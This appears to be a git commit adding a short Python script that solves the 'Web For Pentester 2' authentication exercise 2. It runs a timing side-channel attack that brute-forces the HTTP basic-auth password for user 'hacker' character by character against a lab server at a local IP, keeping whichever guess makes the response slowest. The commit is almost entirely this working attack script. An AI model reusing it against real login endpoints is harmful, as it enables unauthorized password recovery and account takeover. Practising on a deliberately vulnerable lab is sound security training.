dee706c03f3970fc3b8cda913a504fa4d3f4edc5
Gökmen DEMİR <gkmnhyt@gmail.com>
2019-07-08 09:26:19 -0400

    Web For Pentester 2 Authentication Exp 2

---
+++ Python/wfpa2.py
@@ -0,0 +1,25 @@
+# author: Gökmen DEMİR
+# Web For Pentester 2 Authentication Exp2 için
+import requests
+referansList = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
+url = "http://192.168.126.130/authentication/example2/"
+sinirZamani = 1.600
+cennetinKapisi = [""]*62
+tempString = ""
+sonsuz = 1
+while sonsuz:
+    for s in range(0,62):
+        cennetinKapisi[s] += referansList[s]
+    print(cennetinKapisi)
+    for i in range(0,62):
+        character = requests.get(url, auth=('hacker', cennetinKapisi[i])).elapsed.total_seconds()
+        if character > sinirZamani:
+            print(str(cennetinKapisi[i]) + "=" + str(character))
+            tempString = cennetinKapisi[i]
+    for g in range(0,62):
+        cennetinKapisi[g] = tempString
+    print(cennetinKapisi)
+    sinirZamani += 0.2
+    r = requests.get(url)
+    if r.ok:
+        sonsuz = 0
